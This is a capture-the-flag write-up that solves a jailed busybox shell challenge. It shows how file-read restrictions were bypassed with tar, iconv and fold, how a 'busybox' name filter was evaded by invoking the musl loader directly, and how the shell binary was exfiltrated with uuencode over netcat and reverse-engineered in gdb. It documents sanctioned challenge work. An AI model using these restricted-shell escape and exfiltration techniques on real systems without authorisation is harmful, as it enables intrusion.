# Work Computer
## Description
With the confidence of conviction and decision making skills that made you a contender for Xenon's Universal takeover council, now disbanded, you forge ahead to the work computer. This machine announces itself to you, surprisingly with a detailed description of all its hardware and peripherals. Your first thought is "Why does the display stand need to announce its price? And exactly how much does 1000 dollars convert to in Xenonivian Bucklets?" You always were one for the trivialities of things. Also presented is an image of a fascinating round and bumpy creature, labeled "Cauliflower for cWo" - are "Cauliflowers" earthlings? Your 40 hearts skip a beat - these are not the strange unrelatable bipeds you imagined earthings to be.. this looks like your neighbors back home. Such curdley lobes. Will it be at the party? SarahH, who appears to be a programmer with several clients, has left open a terminal. Oops. Sorry clients! Aliens will be poking around attempting to access your networks.. looking for Cauliflower. That is, *if* they can learn to navigate such things.

## README.flag Solution
A server is provided for this challenge. We will assume it requires `netcat` similar to `pwn-buffer-overflow`

```bash session
$ nc readme.ctfcompetition.com 1337
# this drops us into a shell
> ls -l
total 8
----------    1 1338     1338            33 Jul  4 05:32 ORME.flag
-r--------    1 1338     1338            28 Jul  4 05:32 README.flag

> cat README.flag
error: No such file or directory
# that would have been too easy

> uname -a
Linux jail-0 4.15.0-1023-gcp #24-Ubuntu SMP Wed Oct 10 13:28:59 UTC 2018 x86_64 Linux

> ls -l /usr/bin
...
-rwxr-xr-x    1 65534    65534        14208 Jan 29 16:27 c_rehash
-rwxr-xr-x    1 65534    65534        36728 Mar 19 09:56 getconf
-rwxr-xr-x    1 65534    65534        51912 Mar 19 09:56 getent
-rwxr-xr-x    1 65534    65534        25216 Mar 19 09:56 iconv
-rwxr-xr-x    1 65534    65534        83744 Nov 15  2018 scanelf
-rwxr-xr-x    1 65534    65534      1810232 Dec 28  2018 upx
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 yes -> /bin/busybox
# looks like this is busybox
# there are also a couple binaries which don't point to busybox

> ps
PID   USER     TIME  COMMAND
    1 1338      0:00 /bin/shell
   11 1338      0:00 ps

# this is the original solution my team came up with
> tar c README.flag
README.flag0000400000247200024720000000003413507312205010411 0ustar  13381338CTF{4ll_D474_5h4ll_B3_Fr33}

# alternatives discovered while working on the writeup
> iconv README.flag
> fold README.flag
```

### Flag
`CTF{4ll_D474_5h4ll_B3_Fr33}`

## ORME.flag Solution
```bash session
> /bin/busybox whoami
busybox can not be called for alien reasons.
# weird that `whoami` works but not when invoked through `/bin/busybox`

# we don't have access to the `file` command, but can use `scanelf` instead
> scanelf -a /bin/busybox
 TYPE    PAX   PERM ENDIAN STK/REL/PTL TEXTREL RPATH BIND FILE
ET_DYN PeMRxS 0755 LE RW- R-- RW-    -      -   NOW /bin/busybox
# this tells us the `busybox` is a shared object and is invoked by a dynamic linker

# maybe the shell does something funky when calling busybox
> scanelf -i /bin/busybox
 TYPE   INTERP FILE
ET_DYN /lib/ld-musl-x86_64.so.1 /bin/busybox

> /lib/ld-musl-x86_64.so.1 /bin/busybox cat README.flag
CTF{4ll_D474_5h4ll_B3_Fr33}
# ??? this shouldn't be any different than above

# we can call other busybox applets directly
# the owner of a file can chmod even with `0000` permissions
> /lib/ld-musl-x86_64.so.1 /bin/busybox chmod a+r ORME.flag
> /lib/ld-musl-x86_64.so.1 /bin/busybox cat ORME.flag
CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
```

### Flag
`CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}`

## Bonus
### Exfiltrating /bin/shell
What is the `alien reason` that prevents us from running `/bin/busybox <applet>`?

Let's grab a copy of `/bin/shell` and find out.

```bash session
$ echo "/lib/ld-musl-x86_64.so.1 /bin/busybox uuencode /bin/shell shell" | nc readme.ctfcompetition.com 1337 > output
# there is extra shell output in the file
# we need to delete everything from start of file until `begin`, then everything after `end`

$ file output
output: uuencoded or xxencoded, ASCII text

# this creates a binary named `shell` with `0555` permissions as specified by `uuencode`
$ uudecode output

$ file shell
shell: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, not stripped

$ objdump -sj .rodata shell

shell:     file format elf64-x86-64

Contents of section .rodata:
 2000 63640068 656c7000 65786974 001b5b48  cd.help.exit..[H
 2010 1b5b4a00 00000000 0a0a0a0a 2a2a2a2a  .[J.........****
 2020 2a2a2a2a 2a2a2a2a 2a2a2a2a 2a2a2a2a  ****************
 2030 2a2a2a2a 2a2a2a2a 2a2a2a2a 2a2a2a2a  ****************
 2040 2a2a2a2a 2a2a000a 0a0a092a 2a2a2a41  ******.....****A
 2050 4c49454e 20534845 4c4c2a2a 2a2a0055  LIEN SHELL****.U
 2060 53455200 0a0a0a55 53455220 69733a20  SER....USER is: 
 2070 40257300 00000000 616c6965 6e73683a  @%s.....aliensh:
 2080 20657870 65637465 64206172 67756d65   expected argume
 2090 6e742074 6f202263 64220a00 6572726f  nt to "cd"..erro
 20a0 7200416c 69656e27 73207368 656c6c00  r.Alien's shell.
 20b0 54797065 2070726f 6772616d 206e616d  Type program nam
 20c0 65732061 6e642061 7267756d 656e7473  es and arguments
 20d0 2c20616e 64206869 7420656e 7465722e  , and hit enter.
 20e0 00546865 20666f6c 6c6f7769 6e672061  .The following a
 20f0 72652062 75696c74 20696e3a 00202025  re built in:.  %
 2100 730a0000 00000000 55736520 74686520  s.......Use the 
 2110 6d616e20 636f6d6d 616e6420 666f7220  man command for 
 2120 696e666f 726d6174 696f6e20 6f6e206f  information on o
 2130 74686572 2070726f 6772616d 732e0065  ther programs..e
 2140 72726f72 20666f72 6b696e67 006c7368  rror forking.lsh
 2150 3a20616c 6c6f6361 74696f6e 20657272  : allocation err
 2160 6f720a00 616c6965 6e73683a 20616c6c  or..aliensh: all
 2170 6f636174 696f6e20 6572726f 720a0020  ocation error.. 
 2180 090d0a07 003e2000 62757379 626f7800  .....> .busybox.
 2190 62757379 626f7820 63616e20 6e6f7420  busybox can not 
 21a0 62652063 616c6c65 6420666f 7220616c  be called for al
 21b0 69656e20 72656173 6f6e732e 00        ien reasons..
# the alien error message is stored at `0x2190`

$ gdb shell
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from shell...done.
(gdb) disas main
...
(gdb) disas init_shell
...
(gdb) disas lsh_loop
Dump of assembler code for function lsh_loop:
...
   0x00000000000018a4 <+102>:   mov    -0x14(%rbp),%eax
   0x00000000000018a7 <+105>:   cltq
   0x00000000000018a9 <+107>:   lea    0x0(,%rax,8),%rdx
   0x00000000000018b1 <+115>:   mov    -0x8(%rbp),%rax
   0x00000000000018b5 <+119>:   add    %rdx,%rax
   0x00000000000018b8 <+122>:   mov    (%rax),%rax
>  0x00000000000018bb <+125>:   lea    0x8c6(%rip),%rsi        # 0x2188
   0x00000000000018c2 <+132>:   mov    %rax,%rdi
>  0x00000000000018c5 <+135>:   callq  0x10d0 <strstr@plt>
   0x00000000000018ca <+140>:   test   %rax,%rax
>  0x00000000000018cd <+143>:   je     0x18dd <lsh_loop+159>
>  0x00000000000018cf <+145>:   lea    0x8ba(%rip),%rdi        # 0x2190
   0x00000000000018d6 <+152>:   callq  0x1070 <puts@plt>
   0x00000000000018db <+157>:   jmp    0x18ec <lsh_loop+174>
   0x00000000000018dd <+159>:   mov    -0x8(%rbp),%rax
...
End of assembler dump.
(gdb) x/s 0x2188
0x2188: "busybox"
```
The lines starting with `>` are interesting for multiple reasons
* `0x18cf` contains a load for `0x2190` which is the error message
* `strstr` is defined as `char *strstr(const char *haystack, const char *needle);`
* The System V AMD64 ABI calling convention uses `rdi` and `rsi` for the first and second arguments
* The `needle` is the string `busybox` (`0x2188`)
* The `je` branch `lsh_loop+159` is taken if `strstr` returns 0 (needle not in haystack)

Our hypothesis is that `/bin/shell` searches for `busybox` in the executable (`argv[0]`) and returns an error if it exists. A more in-depth analysis involves disassembling `lsh_split_line`. This hypothesis is further supported by testing with `env` and passing `/bin/busybox` as the second argument.
```bash session
> env /bin/busybox cat README.flag
CTF{4ll_D474_5h4ll_B3_Fr33}
```